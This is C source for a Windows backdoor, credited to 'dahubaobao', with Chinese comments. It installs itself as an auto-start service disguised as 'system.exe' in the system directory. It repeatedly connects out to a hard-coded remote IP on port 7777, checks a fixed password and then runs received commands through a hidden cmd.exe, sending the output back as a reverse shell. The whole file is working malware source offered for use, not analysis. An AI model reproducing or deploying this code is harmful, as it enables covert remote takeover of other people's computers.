#include <stdio.h>
#include <winsock2.h>
#pragma comment(lib, "ws2_32.lib")
void  WINAPI ServiceMain(DWORD, LPTSTR *);
DWORD WINAPI CmdService(LPVOID);
DWORD WINAPI CmdShell(LPVOID);
void WINAPI ServiceCtrlHandler(DWORD Opcode);
BOOL  InstallCmdService();
void DelServices();
int  door();
void  Usage(void);
VOID WINAPI EXEBackMain (LPVOID s);
SERVICE_STATUS m_ServiceStatus;
SERVICE_STATUS_HANDLE m_ServiceStatusHandle;
BOOL bRunning = true;
#define PASSSUCCESS "Password success!\n"
#define PASSERROR "Password error.\n"
#define BYEBYE "ByeBye!\n"
#define WSAerron WSAGetLastError()
#define erron GetLastError()
#define PORT 7777 //远程的连接端口
#define DEST_IP_ADDR "12.1.40.149"//要连接的远程IP
int main(int argc, char *argv[])
{
    SERVICE_TABLE_ENTRY DispatchTable[] =
    {
        {"system", ServiceMain}, //服务程序的名称和入口点(函数)
        {NULL    , NULL    }
        //SERVICE_TABLE_ENTRY结构必须以“NULL”结束；
    };
    //  if(argc==1) door();
    if(argc == 2)
    {
        if(!stricmp(argv[1], "-i")) //如果第二个参数等于-install
        {
            InstallCmdService();
        }
        else if(!stricmp(argv[1], "-r")) //比较字符串s1和s2
        {
            DelServices();
        }
        else
        {
            Usage();
        }
        return 0;
    }
    StartServiceCtrlDispatcher(DispatchTable);//把入口点的地址传入
    return 0;
}
int door ()
{
    SOCKET sock = NULL;
    struct sockaddr_in sai;
    TCHAR UserPass[20] = {0};  //用户设置密码缓冲
    TCHAR PassBuf[20] = {0};   //接收密码缓冲
    TCHAR PassBanner[] = "Password:";
    TCHAR Banner[] = "--------- backdoor---------\n";
    sai.sin_family = AF_INET;
    sai.sin_addr.s_addr = inet_addr(DEST_IP_ADDR);
    sai.sin_port = htons(PORT);
    sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    while (TRUE)
    {
        WSADATA wsadata;
        BOOL ThreadFlag = FALSE;
        DWORD ThreadID = 0;
        int nRet = 0;
        nRet = WSAStartup(MAKEWORD(2, 2), &wsadata); //初始化
        if (nRet)
        {
            return 0;
        }
        sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        if (sock == INVALID_SOCKET)
        {
            goto Clean;
        }
        nRet = connect(sock, (struct sockaddr *)&sai, sizeof (struct sockaddr));
        Sleep(5000);
        if (nRet != SOCKET_ERROR)
        {
            nRet = send(sock, Banner, sizeof (Banner), 0);
            while (TRUE)
            {
                nRet = send(sock, PassBanner, sizeof
                            (PassBanner), 0);
                nRet = recv(sock, PassBuf, sizeof (PassBuf) - 1, 0);
                if
                (strnicmp(PassBuf, "dirdir", strlen("dirdir")) == 0)
                {
                    send(sock, PASSSUCCESS, sizeof (PASSSUCCESS), 0);
                    ThreadFlag = TRUE;
                    break;
                }
                if (nRet == SOCKET_ERROR)
                {
                    goto Clean;
                }
                Sleep(100);
            }
            if (ThreadFlag)
            {
                CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)EXEBackMain,
                             (LPVOID)sock, 0, &ThreadID);
            }
        }//endwhile
        Sleep(1000);
    }
Clean:
    if (sock != NULL)
        closesocket(sock);
    WSACleanup();
    return 0;
}
void WINAPI ServiceMain(DWORD dwArgc, LPTSTR *lpArgv)
//服务主函数
{
    m_ServiceStatus.dwServiceType = SERVICE_WIN32;
    m_ServiceStatus.dwCurrentState = SERVICE_START_PENDING;
    m_ServiceStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_PAUSE_CONTINUE;
    m_ServiceStatus.dwWin32ExitCode = 0;
    m_ServiceStatus.dwServiceSpecificExitCode = 0;
    m_ServiceStatus.dwCheckPoint = 0;
    m_ServiceStatus.dwWaitHint = 0;
    m_ServiceStatusHandle = RegisterServiceCtrlHandler("system", ServiceCtrlHandler);
    if (m_ServiceStatusHandle == (SERVICE_STATUS_HANDLE)0)return;
    m_ServiceStatus.dwCurrentState = SERVICE_RUNNING;
    //设置服务状态
    m_ServiceStatus.dwCheckPoint = 0;
    m_ServiceStatus.dwWaitHint = 0;
    //SERVICE_STATUS结构含有七个成员，它们反映服务的现行状态。
    //所有这些成员必须在这个结构被传递到SetServiceStatus之前正确的设置
    if( SetServiceStatus (m_ServiceStatusHandle, &m_ServiceStatus))
        bRunning = true;
    door(); //启动服务程序
    return;
}
void WINAPI ServiceCtrlHandler(DWORD Opcode)//服务控制函数
{
    switch(Opcode)
    {
    case SERVICE_CONTROL_PAUSE:    // we accept the command to pause it
        m_ServiceStatus.dwCurrentState = SERVICE_PAUSED;
        break;
    case SERVICE_CONTROL_CONTINUE:
        m_ServiceStatus.dwCurrentState = SERVICE_RUNNING;
        break;
    case SERVICE_CONTROL_STOP:
        m_ServiceStatus.dwWin32ExitCode = 0;
        m_ServiceStatus.dwCurrentState = SERVICE_STOPPED;
        m_ServiceStatus.dwCheckPoint = 0;
        m_ServiceStatus.dwWaitHint = 0;
        SetServiceStatus (m_ServiceStatusHandle, &m_ServiceStatus);
        bRunning = false;
        break;
    case SERVICE_CONTROL_INTERROGATE:
        break;
    }
    return;
}
BOOL InstallCmdService()//安装服务函数
{
    char strDir[1024];
    SC_HANDLE schSCManager, schService;
    GetCurrentDirectory(1024, strDir); //取当前目录
    GetModuleFileName(NULL, strDir, sizeof(strDir));
    //取当前文件路径和文件名
    char chSysPath[1024];
    GetSystemDirectory(chSysPath, sizeof(chSysPath)); //取系统目录
    strcat(chSysPath, "\\system.exe");
    //将scvhost.exe拼接到系统目录
    if(CopyFile(strDir, chSysPath, FALSE))printf("Copy file OK\n");
    // 把当前服务程序复制到系统根目录为system.exe
    strcpy(strDir, chSysPath);
    schSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
    if (schSCManager == NULL)
    {
        printf("open scmanger failed,maybe you do not have the privilage to do this\n");
        return false;
    }
    LPCTSTR lpszBinaryPathName = strDir;
    schService = CreateService(schSCManager,
                               "system",
                               "system", //将服务的信息添加到SCM的数据库
                               SERVICE_ALL_ACCESS, // desired access
                               SERVICE_WIN32_OWN_PROCESS, // service type
                               SERVICE_AUTO_START, // start type
                               SERVICE_ERROR_NORMAL, // error control type
                               lpszBinaryPathName, // service's binary
                               NULL, // no load ordering group
                               NULL, // no tag identifier
                               NULL, // no dependencies
                               NULL, // LocalSystem account
                               NULL); // no password
    if (schService) printf("Install Service Success!\n");
    else
        return false;
    CloseServiceHandle(schService);
    return true;
}
void DelServices()
{
    char name[100];
    SC_HANDLE scm;
    SC_HANDLE service;
    SERVICE_STATUS status;
    strcpy(name, "system");
    if((scm = OpenSCManager(NULL, NULL, SC_MANAGER_CREATE_SERVICE)) == NULL)
    {
        printf("OpenSCManager Error ");
    }
    service = OpenService(scm, name, SERVICE_ALL_ACCESS | DELETE);
    if (!service)
    {
        printf("OpenService error! ");
        return;
    }
    BOOL isSuccess = QueryServiceStatus(service, &status);
    if (!isSuccess)
    {
        printf("QueryServiceStatus error! ");
        return;
    }
    if ( status.dwCurrentState != SERVICE_STOPPED )
    {
        isSuccess = ControlService(service, SERVICE_CONTROL_STOP, &status);
        if (!isSuccess )
            printf("Stop Service error! ");
        Sleep( 500 );
    }
    isSuccess = DeleteService(service);
    if (!isSuccess)
        printf("Delete Service Fail!");
    else
        printf("Delete Service Success! ");
    CloseServiceHandle(service );
    CloseServiceHandle(scm);
}
VOID WINAPI EXEBackMain (LPVOID s)
//BOOL EXEBackMain (SOCKET sock)
{
    SOCKET sock = (SOCKET)s;
    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    HANDLE hRead = NULL, hWrite = NULL;
    TCHAR CmdSign[] = "\nGood Luck!:\\>";
    while (TRUE)
    {
        TCHAR MsgError[50] = {0};   //错误消息缓冲
        TCHAR Cmdline[300] = {0};   //命令行缓冲
        TCHAR RecvBuf[1024] = {0};  //接收缓冲
        TCHAR SendBuf[2048] = {0};  //发送缓冲
        SECURITY_ATTRIBUTES sa;
        DWORD bytesRead = 0;
        int ret = 0;
        sa.nLength = sizeof(SECURITY_ATTRIBUTES);
        sa.lpSecurityDescriptor = NULL;
        sa.bInheritHandle = TRUE;
        //创建匿名管道
        if (!CreatePipe(&hRead, &hWrite, &sa, 0))
        {
            goto Clean;
        }
        si.cb = sizeof(STARTUPINFO);
        GetStartupInfo(&si);
        si.hStdError = hWrite;
        si.hStdOutput = hWrite;  //进程（cmd）的输出写入管道
        si.wShowWindow = SW_HIDE;
        si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
        GetSystemDirectory(Cmdline, sizeof (Cmdline));
        //获取系统目录
        strcat(Cmdline, "\\cmd.exe /c ");
        //拼接cmd
        // ret=send(sock,CmdSign,sizeof (CmdSign),0);
        //向目标发送提示符
        if (ret == SOCKET_ERROR)
        {
            goto Clean;
        }
        ret = recv(sock, RecvBuf, sizeof (RecvBuf), 0);
        //接收目标数据
        //如果为exit或quit，就退出
        if (strnicmp(RecvBuf, "exit", 4) == 0 || strnicmp(RecvBuf, "quit", 4) == 0)
        {
            send(sock, BYEBYE, sizeof (BYEBYE), 0);
            goto Clean;
        }
        //表示对方已经断开
        if (ret == SOCKET_ERROR)
        {
            goto Clean;
        }
        //表示接收数据出错
        if (ret <= 0)
        {
#ifdef DEBUGMSG
            sprintf(MsgError, "recv() GetLastError reports %d\n", WSAerron);
            send(sock, MsgError, sizeof (MsgError), 0);
#endif
            continue;
        }
        Sleep(100);
        strncat(Cmdline, RecvBuf, sizeof (RecvBuf));
        //拼接一条完整的cmd命令
        //创建进程，也就是执行cmd命令
        if (!CreateProcess(NULL, Cmdline, NULL, NULL, TRUE, NULL, NULL, NULL, &si, &pi))
        {
            continue;
        }
        CloseHandle(hWrite);
        while (TRUE)
        {
            //无限循环读取管道中的数据，直到管道中没有数据为止
            if (ReadFile(hRead, SendBuf, sizeof (SendBuf), &bytesRead, NULL) == 0)
                break;
            send(sock, SendBuf, bytesRead, 0);
            //发送出去
            memset(SendBuf, 0, sizeof (SendBuf));
            //缓冲清零
            Sleep(100);
        }
    }
Clean:
    //释放句柄
    if (hRead != NULL)
        CloseHandle(hRead);
    if (hWrite != NULL)
        CloseHandle(hWrite);
    //释放SOCKET
    if (sock != NULL)
        closesocket(sock);
    WSACleanup();
    ExitThread(0);
    //return 0;
}
void Usage()
{
    fprintf(stderr, "Code by dahubaobao\n"
            "Usage:%s [-i] [-r] -i: install service; -r: remove service.\n");
}
